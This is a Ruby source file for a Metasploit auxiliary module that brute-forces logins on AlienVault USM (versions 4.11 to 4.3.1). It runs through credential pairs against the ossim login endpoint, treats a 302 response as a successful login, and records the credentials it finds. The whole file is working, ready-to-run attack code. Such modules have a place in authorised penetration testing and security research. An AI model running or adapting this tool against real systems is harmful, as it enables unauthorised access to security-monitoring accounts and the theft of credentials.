##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'AlienVault USM Login Bruteforcer',
      'Description' => %q{
        This module attempts to bruteforce AlienVault logins for versions 
        4.11 and 4.3.1 (and likely in between).'
      },
      'References'  => 
      [
        ['EDB', 'none']
      ],
      'Author'      => [ 
        'bperry' 
      ],
      'License'     => 'ExploitHub',
      'DisclosureDate' => 'Sep 20 2014'
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('TARGETURI', [true, 'Base URI of the Alienvault installs', '/'])
      ], self.class)
  end

  def run_host(ip)
    print_status("Trying to bruteforce login")

    res = send_request_cgi({
      'method'  => 'GET',
      'uri'	 => '/'
    })

    unless res
      vprint_error("#{ip} seems to be down")
      return
    end

    each_user_pass { |user, pass|
      try_login(user,pass)
    }
  end

  def try_login(user, pass)
    vprint_status("Trying username:'#{user}' password: '#{pass}'")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),
      'vars_post' => {
        'embed' => '',
        'bookmark_string' => '',
        'user' => user,
        'passu' => pass,
        'pass' => Rex::Text.encode_base64(pass)
      }
    })

    if res and res.code == 302
      print_good("Successful login '#{user}' password: '#{pass}'")
      report_auth_info({
        :host   => rhost,
        :port => rport,
        :proto => 'http',
        :sname  => 'alienvault',
        :user   => user,
        :pass   => pass,
        :target_host => rhost,
        :target_port => rport
      })
      return :next_user
    else
      vprint_error("failed to login as '#{user}' password: '#{pass}'")
      return
    end
  end
end
